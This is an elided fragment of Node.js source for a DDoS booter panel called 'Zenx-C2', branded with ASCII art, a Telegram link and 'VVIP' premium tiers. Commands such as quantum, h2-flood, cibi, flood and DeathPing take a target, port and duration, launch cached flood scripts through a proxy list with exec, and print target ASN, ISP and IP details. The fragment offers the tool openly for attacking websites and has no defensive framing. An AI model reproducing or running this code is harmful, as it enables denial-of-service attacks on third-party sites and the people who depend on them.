...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀    \x1b[1;96m  OWNER: [\x1b[1m\x1b[37m @Zenx \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄    \x1b[1;96m  PREMIUM: [\x1b[1m\x1b[37m VVIP \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀    \x1b[1;96m  TIMELIMITED: [\x1b[1m\x1b[37m NOLIMITED \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀    \x1b[1;96m  ANDA MENGGUNAKAN: [\x1b[1m\x1b[37m TOOLS ZENX \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀    \x1b[1;96m  GABUNG TELE: [\x1b[1m\x1b[37m https://t.me/ybrrapp \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀      ┏━━┓╋┏┓┏┓┏┓╋╋┏━━┓╋╋┏━┳━┓
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀      ┃━┳┻┓┃┗┫┗╋╋┳┓┗┓┏╋┳━┫━┫━╋━┳┳┓
...
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'zx') {
   ...
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    ...
    pushmonitor(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 64 8 proxy.txt`)
    sigma()
...
const metode = path.join(__dirname, `/lib/cache/25`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
...
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by Zenx] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m ${port} \x1b[1;35m]
...
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Zenx \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/ybrrapp \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
...
async function quantum(args) {
  if (args.length < 3) {
    console.log(`Example: .quantum <target> <port> <duration>
quantum https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
...
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m ${port} \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m quantum \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
...
const metode = path.join(__dirname, `/lib/cache/quantum`);
exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
sigma()
};
// [========================================] //
async function h2flood(args) {
  if (args.length < 3) {
    console.log(`Example: .h2-flood <target> <port> <duration>
h2-flood https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
...
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m ${port} \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m h2-flood \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
...
const metode = path.join(__dirname, `/lib/cache/27`);
exec(`node ${metode} ${target} ${duration} 100 10`)
sigma()
};
// [========================================] //
...
// [========================================] //
async function cibi(args) {
  if (args.length < 3) {
    console.log(`Example: .cibi <target> <port> <duration>
cibi https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
...
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m ${port} \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m cibi \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
...
const metode = path.join(__dirname, `/lib/cache/Cibi`);
exec(`node ${metode} ${target} ${duration} 64 8 proxy.txt`)
sigma()
};
// [========================================] //
...
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m ${port} \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m flood \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
...
const metode = path.join(__dirname, `/lib/cache/26`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
...
async function DeathPing(args) {
  if (args.length < 3) {
    console.log(`Example: DeathPing <target <port> <duration>
DeathPing 123.456.78.910 443 120`);
    sigma();
	return
  }
const [target, port, duration] = args
...
exec(`node ${sikma} http://${target} ${port} ${duration}`)
sigma()
};
// ================================================== //
...
`
permen.question(
'╭─[\x1b[1;37m\x1b[31m\x1b[47mZenx-C2\x1b[0m]: \n╰┈┈┈┈➤',(input) => {
